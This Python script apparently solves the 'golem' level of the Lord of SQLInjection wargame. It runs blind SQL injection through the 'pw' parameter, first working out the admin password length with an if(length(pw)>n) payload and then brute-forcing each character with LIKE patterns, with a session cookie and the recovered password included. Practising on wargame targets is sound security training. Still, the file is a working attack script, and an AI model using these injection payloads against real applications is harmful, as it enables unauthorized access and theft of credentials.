import requests

pw_Length = 0
pw = ""

url = "http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php"

headers = {
    "Cookie": "PHPSESSID=q4oarsunrhtmvm2gk51qvqu8v2"
}

# Found Admin PW Length mysql if(condition, true, false)
# Length : 8

for i in range(1,20):
    params = {
        "pw":"' || if(length(pw)>%d,1,0) && id like 'admin" % i
    }

    print "[Try Find Admin PW Length] : %d " % i
    res = requests.get(url, params=params, headers=headers)

    if "Hello admin" not in res.content:
        pw_Length = i
        print "admin PW Length: %d" % i
        break

# Found Admin PW : 77d6290b

for i in range(1,(pw_Length+1)):
    for j in range(0x20, 0x7f):
        if (j==0x3d) or (j == 0x27) or (j== 0x22) or (j==0x25) or (j==0x21) or (j==0x23):  
            continue
        a = pw+chr(j)+"%"
        
        params = {
            "pw":"' || pw like '%s' && id like 'admin" % a
        }
        print "[Try index :%d, %c]" % (i,j)
        
        try:
            res = requests.get(url, params=params, headers=headers)
        
        except Exception as e:
            j=j-1
            continue

        if "Hello admin" in res.content:
            print "Found It!! index: %d, %c" % (i,j)
            pw = pw+chr(j)
            print "[pw: %s]" % pw
            break

print "password:",pw.lower()
            
        

